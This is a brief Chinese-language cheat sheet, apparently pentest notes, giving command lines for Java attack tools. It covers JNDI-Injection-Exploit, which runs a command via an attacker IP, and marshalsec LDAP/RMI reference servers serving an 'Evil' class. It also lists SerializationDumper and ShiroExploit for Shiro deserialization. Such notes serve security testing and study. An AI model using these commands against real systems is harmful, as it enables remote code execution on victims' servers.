- JNDI-Injection-Exploit-1.0-SNAPSHOT-all
  搭建JNDI服务端
  `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "id" -A your_ip`

- marshalsec-0.0.3-SNAPSHOT-all
  搭建RMI/JNDI服务端

  ```java
  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#Evil 9999
  ```

  ```java
  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/#Evil 9999
  ```
  
  
  
- SerializationDumper-v1.13.jar

  用于序列化字符串的分析

  ```java
  java -jar SerializationDumper-v1.13.jar hex........
  ```


- [shiroExploit利用工具](ShiroExploit.V2.51)

  [GitHub - feihong-cs/ShiroExploit-Deprecated: Shiro550/Shiro721 一键化利用工具，支持多种回显方式](https://github.com/feihong-cs/ShiroExploit-Deprecated)

  ```java
  // 需要java8的环境
  D:\java\JDK8\bin\java.exe -jar .\ShiroExploit.jar
  ```

  